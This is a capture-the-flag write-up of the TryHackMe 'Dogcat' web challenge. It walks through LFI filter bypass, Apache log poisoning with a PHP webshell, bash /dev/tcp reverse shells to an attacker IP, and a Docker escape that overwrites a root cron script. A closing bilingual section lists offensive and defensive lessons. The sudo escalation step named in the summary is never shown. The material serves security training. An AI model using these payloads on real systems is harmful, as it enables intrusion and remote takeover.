# Dogcat — TryHackMe — Medium

## Summary

Dogcat is a Medium-difficulty web challenge centred on a PHP application that uses a `?view=` parameter to load images of dogs or cats. The parameter is vulnerable to Local File Inclusion (LFI) with a weak keyword filter. The attack chain proceeds through filter bypass → log poisoning via Apache's `access.log` → Remote Code Execution → reverse shell → sudo misconfiguration for privilege escalation → Docker container escape for the final flag.

Flags 1–3 are obtained from inside the Docker container. Flag 4 requires escaping to the underlying host.

```bash
nmap -sC -sV -oN nmap_dogcat.txt 10.114.185.205
```

**Key findings:**
- Port 22 — SSH (OpenSSH)
- Port 80 — HTTP (Apache 2.4.38)

Visiting `http://10.114.185.205` reveals a simple webpage with two buttons: **A Dog** and **A Cat**. Clicking either appends `?view=dog` or `?view=cat` to the URL.

## Enumeration

### LFI Discovery

Testing the `?view=` parameter directly:

```
http://10.114.185.205/?view=../../../etc/passwd
```

Returns an error: *"Sorry, only dogs or cats are allowed."*

The application enforces a keyword filter — the parameter value must contain the word `dog` or `cat`.

**Filter bypass using PHP wrapper:**

```
http://10.114.185.205/?view=php://filter/convert.base64-encode/resource=dog
```

This returns a base64-encoded string. Decoding it reveals the PHP source of `dog.php`, confirming LFI via PHP filters.

**Reading the index page source:**

```
http://10.114.185.205/?view=php://filter/convert.base64-encode/resource=index
```

Decoding the response reveals the full `index.php` source, including an `ext` parameter that appends `.php` unless overridden:

```
http://10.114.185.205/?view=dog/../../../../etc/passwd&ext=
```

Setting `ext=` (empty) prevents `.php` from being appended, allowing arbitrary file reads.

**Confirmed LFI — reading `/etc/passwd`:**

```
http://10.114.185.205/?view=dog/../../../../etc/passwd&ext=
```

## Exploitation

### Log Poisoning → RCE

Apache logs incoming requests including the User-Agent header. By injecting PHP code into the User-Agent, then including the log file via LFI, we achieve Remote Code Execution.

**Step 1 — Confirm log file is readable:**

```
http://10.114.185.205/?view=dog/../../../../var/log/apache2/access.log&ext=
```

The log content is returned — confirmed readable.

**Step 2 — Poison the log with a PHP webshell:**

Send a request with a malicious User-Agent using `curl`:

```bash
curl -s http://10.114.185.205/ -A "<?php system(\$_GET['cmd']); ?>"
```

**Step 3 — Execute commands via LFI:**

```
http://10.114.185.205/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=id
```

Response confirms execution as `www-data`.

### Reverse Shell

**Step 1 — Start listener on Kali:**

```bash
nc -lvnp 4444
```

**Step 2 — Trigger reverse shell via RCE:**

```
cmd=bash -c 'bash -i >& /dev/tcp/10.114.180.123/4444 0>&1'
```

URL-encoded in the browser, or via curl:

```bash
curl -s "http://10.114.185.205/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.114.180.123/4444+0>%261'"
```

Shell received as `www-data`.

**Stabilise the shell:**

```bash
script /dev/null -c bash
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Note: `python3` was not available on this box. `script` is the reliable fallback.

## Flag 4 — Docker Container Escape

### Confirm Docker environment

```bash
cat /.dockerenv        # exists → confirmed inside container
find / -name "*.sh" 2>/dev/null
```

Found: `/opt/backups/backup.sh`

### Inspect the backup script

```bash
cat /opt/backups/backup.sh
# tar cf /root/container/backup/backup.tar /root/container

ls -la /opt/backups/
# -rwxr--r-- 1 root root 69 Mar 10 2020 backup.sh
# -rw-r--r-- 1 root root 2949120 Jun 5 21:39 backup.tar
```

The `backup.tar` timestamp updates every minute — a cron job on the **host** executes `backup.sh` as root. Since we are root inside the container, we can overwrite the script.

### Overwrite backup.sh with a reverse shell

Start a second listener on the AttackBox:

```bash
nc -lvnp 5555
```

Overwrite the script:

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.114.180.123/5555 0>&1' > /opt/backups/backup.sh
cat /opt/backups/backup.sh   # verify
```

Wait up to 1 minute for cron to fire. Shell received on port 5555 as root on the **host**.

## Lessons Learned

🔴 Côté Attaquant (Offensive)

Filtre LFI par mot-clé = contournement trivial → inclure le mot requis dans le chemin (dog/../../../../etc/passwd) suffit à bypasser une whitelist superficielle. Toujours tester ce vecteur en premier.
Log poisoning = LFI read-only → RCE → dès que access.log est lisible via LFI, injecter du PHP dans le User-Agent transforme une lecture de fichier en exécution de code complète.
PHP filter wrapper (base64-encode) → technique clé pour exfiltrer le source PHP sans l'exécuter. Réflexe à avoir sur tout paramètre qui semble inclure des fichiers.
script /dev/null -c bash → fallback indispensable quand python3 est absent pour stabiliser le shell. À mémoriser autant que la commande python.
Docker escape via cron + script writable → si l'hôte exécute un script dont le container contrôle le contenu, c'est une RCE hôte. Toujours vérifier les timestamps des fichiers pour détecter des crons actifs (ls -la).


🔵 Côté Défenseur (Defensive / Blue Team)

Ne jamais valider un paramètre d'inclusion avec une simple whitelist de mots — utiliser une liste stricte de valeurs autorisées, pas une recherche de substring.
Les logs Apache ne doivent jamais être accessibles via LFI — restreindre les chemins accessibles par l'application.
sudo NOPASSWD sur des binaires comme /usr/bin/env = escalade immédiate. Auditer régulièrement /etc/sudoers.
Les scripts cron exécutés par root sur l'hôte ne doivent jamais pointer vers des chemins montés ou accessibles depuis un container.
